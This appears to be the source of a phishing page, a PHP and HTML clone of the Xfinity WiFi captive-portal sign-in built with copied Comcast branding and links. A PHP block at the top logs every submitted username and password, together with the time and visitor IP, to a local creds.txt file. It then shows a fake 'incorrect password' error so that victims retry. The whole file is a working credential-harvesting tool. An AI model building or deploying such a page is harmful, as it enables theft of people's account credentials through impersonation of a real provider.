<?php
$err = "";
if (!empty($_POST)) {
  $user = $_POST['username'];
  $pass = $_POST['password'];
  $ipad = $_SERVER["REMOTE_ADDR"];
  $dttm = date('Y-m-d H:i:s');
  file_put_contents('creds.txt',"$dttm|$ipad|$user/$pass\n",FILE_APPEND);
  $err = "Incorrect username/password. Try again.";
}
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>xFinity | Portal</title>

    <link rel="stylesheet" href="stylesheets/nice-select.css">
    <link rel="stylesheet" href="stylesheets/simple-line-icons-master/css/simple-line-icons.css">
    <link rel="stylesheet" href="stylesheets/styles.css">
    <link rel="shortcut icon" href="images/favicon.png?1" type="image/x-icon" />
    <link rel="stylesheet" href="stylesheets/custom-styles.css">
</head>
<body>


   <div class="container">
    <!-- Example row of columns -->
      <header>
        <div class="row align-items-center">

          <div class="col-12 col-md-3 col-lg-4">
            <div class="brand-container">
              <div class="logo-container"><img src="images/svg/xfinity-new-blk.svg" alt="Xfinity"></div>
              <div class="tagline">Sign in to your Xfinity account to get online now.</div>
            </div><!-- brand-container end -->
          </div><!-- col end -->

          <div class="col-xs-12 col-md-9 col-lg-8">
            <form novalidate name="signin" class="customer-signin-form signin-container" action="index.php" method="post">

              <div>
                    <ul class="error_box">
                                          </ul>
                  </div>
              <div class="row">
              <div class="col-xs-12 col-md-5 col-lg-5">
                    <label for="" class="username-field"><input class="username" id="username" type="text" name="username" value="" placeholder="Username, Email, or Mobile #"><span>Forgot your  <a href="https://login.comcast.net/myaccount/lookup?continue=https://wifilogin.comcast.net%2Fwifi%2Fportal_captive.php%3Fcm%3D00%253A00%253A00%253A00%253A00%253A00">username</a>?</span><div class="username-label">USERNAME</div></label>
              </div><!-- col end -->
              <div class="col-xs-12 col-md-5 col-lg-5">
                  <label for="" class="pass-field"><input class="password" id="password" type="password" name="password" value="" placeholder="Password"><span>Forgot your  <a href="https://login.comcast.net/myaccount/reset?continue=https://wifilogin.comcast.net%2Fwifi%2Fportal_captive.php%3Fcm%3D00%253A00%253A00%253A00%253A00%253A00">password</a>?</span><div class="password-label">PASSWORD</div></label>
              </div><!-- col end -->
              <div class="col-xs-12 col-md-2 col-lg-2">
                    <input type="submit" class="btn btn_authenticate" name="" value="Sign In">
                      <div class="mobile-recovery">Forgot your <a href="https://login.comcast.net/myaccount/lookup?continue=https://wifilogin.comcast.net%2Fwifi%2Fportal_captive.php%3Fcm%3D00%253A00%253A00%253A00%253A00%253A00">username</a> or <a href="https://login.comcast.net/myaccount/reset?continue=https://wifilogin.comcast.net%2Fwifi%2Fportal_captive.php%3Fcm%3D00%253A00%253A00%253A00%253A00%253A00">password</a>?</div>
              </div><!-- col end -->
              </div>
            </form>
          </div><!-- col end -->

        </div><!-- row end -->
      </header>
  </div>


  <section class="hero-container">
    <div class="container">
      <div class="row">

        <div class="col-xs-12 col-lg-5 desktop-to-medium">

          <div class="img-container-list">
            <div class="img-container"><img class="hero-image" src="images/st22.png" alt="iphone"></div>
            <ul>
              <li><img src="images/svg/icon-bolt.svg" alt="bolt"> <span>Coverage where you need it</span></li>
              <li><img src="images/svg/icon-wifi.svg" alt="wifi"> <span>Unlimited WiFi Data</span></li>
              <li><img src="images/svg/icon-contracts.svg" alt="contracts"> <span>No long term contracts</span></li>
            </ul>
          </div><!-- img-container-list -->

        </div>

        <div class="col-xs-12 col-lg-7">
            <section class="hero-content">
              <h2>Not an Xfinity customer? No Problem.</h2>
              <p>Start your free WiFi On Demand trial or buy a pass today.</p>
              <p class="hero-btn-container">
                 <a id="amdocs_signup" href="https://wifiondemand.xfinity.com/wod/landing?c=n&macId=00%3A00%3A00%3A00%3A00%3A00&bn=st22&location=default&apMacId=00:00:00:00:00:00&issuer=r&deviceModel=default&NASIP=0&deviceName=default&deviceName=default" class="btn signUpButton" data-redirect='https://wifiondemand.xfinity.com/wod/landing?c=n&macId=00%3A00%3A00%3A00%3A00%3A00&bn=st22&location=default&apMacId=00:00:00:00:00:00&issuer=r&deviceModel=default&NASIP=0&deviceName=default&deviceName=default'>Get Started</a>
              </p>
              <p>Create a free account and download your WiFi On Demand pass instantly. Connect to millions of hotspots nationwide and take advantage of unlimited WiFi hotspots data.</p>
            </section><!-- featured-resource end  -->
        </div>

        <div class="col-xs-12 col-lg-5 medium">

          <div class="img-container-list">
            <div class="img-container"><img class="hero-image" src="images/st22.png" alt="iphone"></div>
            <ul>
              <li><img src="images/svg/icon-bolt.svg" alt="bolt"> <span>Coverage where you need it</span></li>
              <li><img src="images/svg/icon-wifi.svg" alt="wifi"> <span>Unlimited WiFi Data</span></li>
              <li><img src="images/svg/icon-contracts.svg" alt="contracts"> <span>No long term contracts</span></li>
            </ul>
          </div><!-- img-container-list -->

        </div>

      </div>
    </div>
  </section>

  <footer>
    <div class="container">
      <div class="row">

        <div class="col-12 col-lg-4">

          <div class="mobile-select-container">
              <select onchange="location = this.value;">
                <option value="portal_captive.php?set_language=en&hash=Mgq8YTWmh92a83f5P1SFAfFdfLOFMtzoHyh1zJ5mVFZYBM8jJVGJRAJvpgbb2%2BrvI%2Bed1M56sCwsB3S8qk%2Bg%2Bm0Tbt%2FrWv8ReXG9OGAI%2FI6NKiFaQ%2BExw9jCHeHJISKN1V27F1PzXcvGawVQf2%2FZojjXx%2FnX0UIe%2BcZLTAh8hv%2FJX4YA8H54M7Ln7C%2FVAWkW%2FTFdKQenbKDr4SignHtEB%2FPE99FG%2FHqu0OIil5HvyedVGqTs66%2BeF%2BGDceQqW4TUYhoxVP8pcXsukRKFdit%2F2v0rFc5wonfNswu89csfTJkMbk%2BllnCYfa%2BPI5avWkxIDtOe%2F9F1V%2FaDEwBmoCVUIg%3D%3D"selected>English</option>
                <option value="portal_captive.php?set_language=es&hash=Mgq8YTWmh92a83f5P1SFAfFdfLOFMtzoHyh1zJ5mVFZYBM8jJVGJRAJvpgbb2%2BrvI%2Bed1M56sCwsB3S8qk%2Bg%2Bm0Tbt%2FrWv8ReXG9OGAI%2FI6NKiFaQ%2BExw9jCHeHJISKN1V27F1PzXcvGawVQf2%2FZojjXx%2FnX0UIe%2BcZLTAh8hv%2FJX4YA8H54M7Ln7C%2FVAWkW%2FTFdKQenbKDr4SignHtEB%2FPE99FG%2FHqu0OIil5HvyedVGqTs66%2BeF%2BGDceQqW4TUYhoxVP8pcXsukRKFdit%2F2v0rFc5wonfNswu89csfTJkMbk%2BllnCYfa%2BPI5avWkxIDtOe%2F9F1V%2FaDEwBmoCVUIg%3D%3D" >Spanish</option>
              </select>
          </div><!-- mobile select -->

          <div class="footer-link-container">
            <ul class="img-list">
              <li><a href=""><img class="footer-comcast" src="images/svg/comcast-logo.svg" alt="comcast"></a></li>
            </ul>
            <div class="copyright">&copy; 2018 Comcast. All rights reserved.</div>
            <ul>
              <li><a href="https://my.xfinity.com/privacy/">Privacy Policy</a></li>
              <li>|</li>
              <li><a href="https://my.xfinity.com/terms/web/">Terms of Service</a></li>
            </ul>
          </div><!-- footer-link-container select -->

        </div><!-- col end -->

        <div class="col-12 col-lg-3">
          <div class="desktop-select-container">
          <select onchange="location = this.value;">
                <option value="portal_captive.php?set_language=en&hash=Mgq8YTWmh92a83f5P1SFAfFdfLOFMtzoHyh1zJ5mVFZYBM8jJVGJRAJvpgbb2%2BrvI%2Bed1M56sCwsB3S8qk%2Bg%2Bm0Tbt%2FrWv8ReXG9OGAI%2FI6NKiFaQ%2BExw9jCHeHJISKN1V27F1PzXcvGawVQf2%2FZojjXx%2FnX0UIe%2BcZLTAh8hv%2FJX4YA8H54M7Ln7C%2FVAWkW%2FTFdKQenbKDr4SignHtEB%2FPE99FG%2FHqu0OIil5HvyedVGqTs66%2BeF%2BGDceQqW4TUYhoxVP8pcXsukRKFdit%2F2v0rFc5wonfNswu89csfTJkMbk%2BllnCYfa%2BPI5avWkxIDtOe%2F9F1V%2FaDEwBmoCVUIg%3D%3D"selected>English</option>
                <option value="portal_captive.php?set_language=es&hash=Mgq8YTWmh92a83f5P1SFAfFdfLOFMtzoHyh1zJ5mVFZYBM8jJVGJRAJvpgbb2%2BrvI%2Bed1M56sCwsB3S8qk%2Bg%2Bm0Tbt%2FrWv8ReXG9OGAI%2FI6NKiFaQ%2BExw9jCHeHJISKN1V27F1PzXcvGawVQf2%2FZojjXx%2FnX0UIe%2BcZLTAh8hv%2FJX4YA8H54M7Ln7C%2FVAWkW%2FTFdKQenbKDr4SignHtEB%2FPE99FG%2FHqu0OIil5HvyedVGqTs66%2BeF%2BGDceQqW4TUYhoxVP8pcXsukRKFdit%2F2v0rFc5wonfNswu89csfTJkMbk%2BllnCYfa%2BPI5avWkxIDtOe%2F9F1V%2FaDEwBmoCVUIg%3D%3D" >Spanish</option>
              </select>
          </div>
        </div><!-- col end -->

        <div class="col-12 col-lg-5">

          <div class="footer-detail-container">
            <ul>
              <li><a href="https://wifi.xfinity.com/faq.php">FAQ</a></li>
              <li>&#x7c;</li>
              <li><a href="contact_us.php">Contact Us</a></li>
            </ul>
            <p>Xfinity Internet customers* get instant access to Xfinity WiFi Hotspots at millions of locations nationwide.<br>
              <span class="mobile-hidden">Call 1-800-Xfinity to learn more.</span>
              <span class="desktop-hidden"><a href="tel:18003330010">Call 1-800-Xfinity to learn more.</a></span></p>
            <p class="special-details">*Xfinity WiFi Hotspots included with Performance Internet and above. Limited access available to Performance Starter and below. Available in select areas.</p>
          </div><!-- footer-detail-container -->

        </div><!-- col end -->

      </div><!-- row end -->
    </div><!-- container end -->
  </footer>

    <!-- jQuery first, then Tether, then Bootstrap JS. -->
    <script src="javascripts/jquery.min.js" ></script>
    <script src="javascripts/bootstrap.min.js" ></script>
    <script src="javascripts/jquery.nice-select.min.js" ></script>
    <script src="javascripts/custom.js"></script>
    <script type="text/javascript">_satellite.pageBottom();</script>


<script>document.onload = function() { document.getElementById("username").focus();};</script>

</body>
</html>
